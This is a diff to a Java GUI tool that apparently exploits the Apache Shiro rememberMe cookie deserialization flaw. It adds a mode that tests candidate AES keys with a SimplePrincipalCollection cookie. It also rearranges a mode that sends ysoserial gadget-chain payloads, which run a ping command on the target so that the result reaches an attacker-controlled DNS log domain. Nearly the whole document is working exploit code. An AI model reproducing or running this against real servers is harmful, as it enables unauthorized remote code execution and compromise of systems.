@@ -10,6 +10,7 @@ import javafx.scene.layout.AnchorPane;
 import javafx.stage.Stage;
 import net.sf.json.JSONObject;
 import org.apache.http.HttpResponse;
+import org.apache.shiro.subject.SimplePrincipalCollection;
 import sun.misc.BASE64Decoder;
 import ysoserial.payloads.ObjectPayload;
 
@@ -28,8 +29,9 @@ public class MainApp extends Application {
     private RadioButton radioButtonCustom;
     private RadioButton radioBtnURLDNS;
     private RadioButton radioBtnPayload;
-    private boolean isURLDNSCheck = true;
+    private RadioButton radioBtnPrincipalCollection;
     private TextField textField_DNSURL;
+    private int CheckMethod = 0;
     private TextArea textAreaResult;
     private Button startBtn;
     private Button stopBtn;
@@ -69,8 +71,11 @@ public class MainApp extends Application {
         textAreaKeys = createTextArea(check_keys,34,130,235,282);
         final ToggleGroup toggleGroup_checkMethod = new ToggleGroup();
         radioBtnURLDNS= createRadioButton("使用URLDNS",316,130,165,17.5);
-        radioBtnPayload= createRadioButton("使用Payloads",500,130,165,17.5);
+        radioBtnPayload= createRadioButton("使用Payloads",423,130,165,17.5);
+        radioBtnPrincipalCollection=createRadioButton("XCheck",540,130,115,17.5);
         radioBtnURLDNS.setToggleGroup(toggleGroup_checkMethod);
+
+        radioBtnPrincipalCollection.setToggleGroup(toggleGroup_checkMethod);
         radioBtnURLDNS.setSelected(true);
         radioBtnPayload.setToggleGroup(toggleGroup_checkMethod);
         Label dnsURLLabel = createLabel("DNSURL:",316,170,53,17);
@@ -116,10 +121,23 @@ public class MainApp extends Application {
         });
 
         radioBtnURLDNS.setOnAction(event -> {//使用URLDNS检测
-            isURLDNSCheck = true;
+            CheckMethod = 0;
+            radioButtonCustom.setDisable(false);
+            radioBtnDefault.setDisable(false);
+            textField_DNSURL.setEditable(true);
         });
         radioBtnPayload.setOnAction(event -> {//使用Payload检测
-            isURLDNSCheck = false;
+            CheckMethod = 1;
+            radioButtonCustom.setDisable(false);
+            radioBtnDefault.setDisable(false);
+            textField_DNSURL.setEditable(true);
+        });
+        radioBtnPrincipalCollection.setOnAction(event -> {//使用SimplePrincipalCollection
+            CheckMethod = 2;
+            radioButtonCustom.setDisable(true);
+            radioBtnDefault.setDisable(true);
+            textField_DNSURL.setEditable(false);
+            textAreaResult.setText("");
         });
 
 
@@ -136,23 +154,37 @@ public class MainApp extends Application {
                 showAlert(Alert.AlertType.WARNING, "警告", "检测网址不能为空!");
                 return;
             }
-            if(textField_DNSURL.getText() == null || textAreaKeys.getText()==null){
-                showAlert(Alert.AlertType.WARNING, "警告", "检测的keys和dnslog不能为空");
+            url = textField_url.getText().trim();
+            if(!UtilMethod.checkIsShiro(url)){
+                showAlert(Alert.AlertType.WARNING, "警告", "该系统疑似没有采用Shiro框架!");
                 return;
             }
-            if(!textField_DNSURL.getText().trim().equals("") && !textAreaKeys.getText().trim().equals("")){
+
+            if(textField_DNSURL.getText() == null && CheckMethod < 2){
+                showAlert(Alert.AlertType.WARNING, "警告", "DNSURL不能为空");
+                return;
+            }
+
+            if(textAreaKeys.getText()==null){
+                showAlert(Alert.AlertType.WARNING, "警告", "检测的key不能为空");
+                return;
+            }
+            if(!textAreaKeys.getText().trim().equals("")){
                 radioButtonCustom.setDisable(true);
                 radioBtnDefault.setDisable(true);
                 radioBtnPayload.setDisable(true);
                 radioBtnURLDNS.setDisable(true);
+                radioBtnPrincipalCollection.setDisable(true);
                 startBtn.setDisable(true);
                 stopBtn.setDisable(false);
                 url = textField_url.getText().trim();
                 String checkKeyStr = textAreaKeys.getText();
 
                 String dnsDomain = textField_DNSURL.getText();
-                dnsDomain = dnsDomain.replaceAll("https://","").replaceAll("http://","");
+                if(CheckMethod < 2){
+                    dnsDomain = dnsDomain.replaceAll("https://","").replaceAll("http://","");
 
+                }
                 String keys[] = checkKeyStr.split("\n");
 
                 String finalDnsDomain = dnsDomain;
@@ -173,57 +205,72 @@ public class MainApp extends Application {
                                     }
                                     byte[] bytes;
                                     try {
-                                        if(isURLDNSCheck){
-                                            bytes = URLDNSCheck.makeDNSURL(key + "." + finalDnsDomain);
-                                            String rememberMe = (ShiroAESCrypto.encrypt(bytes, new BASE64Decoder().decodeBuffer(key))).replaceAll("\n", "");//.replaceAll("\\+","%2b");;
-                                            String cookie = "rememberMe=" + rememberMe+";";
-                                            HttpResponse response = UtilMethod.doHttpRequest(url,cookie);
-
-                                            if(response != null){
-                                                if (response.getStatusLine().getStatusCode() == 200) {
-                                                    sb.append("send ").append(key).append("\tok");
-                                                } else {
-                                                    sb.append("send ").append(key).append("\tfailed");
-                                                }
-                                            }else{
-                                                sb.append("send ").append(key).append("\terror");
-                                            }
-                                        }else{
-                                            String classNames[] = {"CommonsBeanutils1",
-                                                    "CommonsCollections1",
-                                                    "CommonsCollections2",
-                                                    "CommonsCollections3",
-                                                    "CommonsCollections4",
-                                                    "CommonsCollections5", //"CommonsCollections55",
-                                                    "CommonsCollections6",
-                                                    "CommonsCollections8",
-                                                    "CommonsCollections10"};
-
-                                            sb.append("key:");
-                                            sb.append(key);
-                                            sb.append("\n");
-                                            for(String tt:classNames){
-
-                                                String className = "ysoserial.payloads." + tt;
-                                                String codeCommand = "ping "+key.substring(0,3)+"."+tt+"."+finalDnsDomain;
-                                                ObjectPayload objectPayload = (ObjectPayload) Class.forName(className).newInstance();
-                                                byte[] ser = Serializer.serialize(objectPayload.getObject(codeCommand));
-                                                String remember = (ShiroAESCrypto.encrypt(ser,new BASE64Decoder().decodeBuffer(key))).replaceAll("\n","");//.replaceAll("\\+","%2b");;
-                                                String cookie = "rememberMe="+remember+";";
+                                        switch (CheckMethod){
+                                            case 0:
+                                                bytes = URLDNSCheck.makeDNSURL(key + "." + finalDnsDomain);
+                                                String rememberMe = (ShiroAESCrypto.encrypt(bytes, new BASE64Decoder().decodeBuffer(key))).replaceAll("\n", "");//.replaceAll("\\+","%2b");;
+                                                String cookie = "rememberMe=" + rememberMe+";";
                                                 HttpResponse response = UtilMethod.doHttpRequest(url,cookie);
 
                                                 if(response != null){
                                                     if (response.getStatusLine().getStatusCode() == 200) {
-                                                        sb.append("send ").append(tt).append("\tok");
+                                                        sb.append("send ").append(key).append("\tok");
                                                     } else {
-                                                        sb.append("send ").append(tt).append("\tfailed");
+                                                        sb.append("send ").append(key).append("\tfailed");
                                                     }
                                                 }else{
-                                                    sb.append("send ").append(tt).append("\terror");
+                                                    sb.append("send ").append(key).append("\terror");
                                                 }
+                                                break;
+                                            case 1:
+                                                String classNames[] = {"CommonsBeanutils1",
+                                                        "CommonsCollections1",
+                                                        "CommonsCollections2",
+                                                        "CommonsCollections3",
+                                                        "CommonsCollections4",
+                                                        "CommonsCollections5", //"CommonsCollections55",
+                                                        "CommonsCollections6",
+                                                        "CommonsCollections8",
+                                                        "CommonsCollections10"};
+
+                                                sb.append("key:");
+                                                sb.append(key);
                                                 sb.append("\n");
-                                            }
+                                                for(String tt:classNames){
+
+                                                    String className = "ysoserial.payloads." + tt;
+                                                    String codeCommand = "ping "+key.substring(0,3)+"."+tt+"."+finalDnsDomain;
+                                                    ObjectPayload objectPayload = (ObjectPayload) Class.forName(className).newInstance();
+                                                    byte[] ser = Serializer.serialize(objectPayload.getObject(codeCommand));
+                                                    String remember = (ShiroAESCrypto.encrypt(ser,new BASE64Decoder().decodeBuffer(key))).replaceAll("\n","");//.replaceAll("\\+","%2b");;
+                                                    cookie = "rememberMe="+remember+";";
+                                                    response = UtilMethod.doHttpRequest(url,cookie);
+
+                                                    if(response != null){
+                                                        if (response.getStatusLine().getStatusCode() == 200) {
+                                                            sb.append("send ").append(tt).append("\tok");
+                                                        } else {
+                                                            sb.append("send ").append(tt).append("\tfailed");
+                                                        }
+                                                    }else{
+                                                        sb.append("send ").append(tt).append("\terror");
+                                                    }
+                                                    sb.append("\n");
+                                                }
+                                                break;
+                                            case 2:
+                                                SimplePrincipalCollection simplePrincipalCollection = new SimplePrincipalCollection();
+                                                bytes = Serializer.serialize(simplePrincipalCollection);
+                                                rememberMe = (ShiroAESCrypto.encrypt(bytes, new BASE64Decoder().decodeBuffer(key))).replaceAll("\n", "");//.replaceAll("\\+","%2b");;
+                                                cookie = "rememberMe=" + rememberMe+";";
+                                                if(UtilMethod.hasDeleteMe(url,cookie)){
+                                                    sb.append(key).append("\tis error");
+                                                }else{
+                                                    sb.append(key).append("\tis right");
+                                                }
+                                                break;
                                         }
+
                                         
 
                                         sb.append("\r\n");
@@ -237,10 +284,12 @@ public class MainApp extends Application {
                                 }
                                 sb.append("-------------------------------------");
                                 sb.append("\r\n");
-                                if(radioCustom){
-                                    sb.append("请到DNSLOG平台\"").append(finalDnsDomain).append("\"查看结果");
-                                }else{
-                                    sb.append(UtilMethod.getRecords(domainCookie));
+                                if(CheckMethod <2){
+                                    if(radioCustom){
+                                        sb.append("请到DNSLOG平台\"").append(finalDnsDomain).append("\"查看结果");
+                                    }else{
+                                        sb.append(UtilMethod.getRecords(domainCookie));
+                                    }
                                 }
 
                                 sb.append("\r\n");
@@ -253,6 +302,7 @@ public class MainApp extends Application {
                 service.start();
                 textAreaResult.textProperty().bind(service.valueProperty());
                 service.setOnSucceeded(e -> {
+                    radioBtnPrincipalCollection.setDisable(false);
                     radioButtonCustom.setDisable(false);
                     radioBtnDefault.setDisable(false);
                     startBtn.setDisable(false);
@@ -261,6 +311,7 @@ public class MainApp extends Application {
                     stopBtn.setDisable(true);
                 });
                 service.setOnCancelled(e -> {
+                    radioBtnPrincipalCollection.setDisable(false);
                     radioButtonCustom.setDisable(false);
                     radioBtnDefault.setDisable(false);
                     startBtn.setDisable(false);
@@ -280,7 +331,7 @@ public class MainApp extends Application {
         });
 
         rootLayout.getChildren().addAll( label_URL,textField_url,keyLabel,radioBtnDefault,radioButtonCustom,startBtn,
-                stopBtn,radioBtnURLDNS,radioBtnPayload,
+                stopBtn,radioBtnURLDNS,radioBtnPayload,radioBtnPrincipalCollection,
                 textAreaKeys,dnsURLLabel,textField_DNSURL,textAreaResult);
 
         primaryStage.setScene(scene);
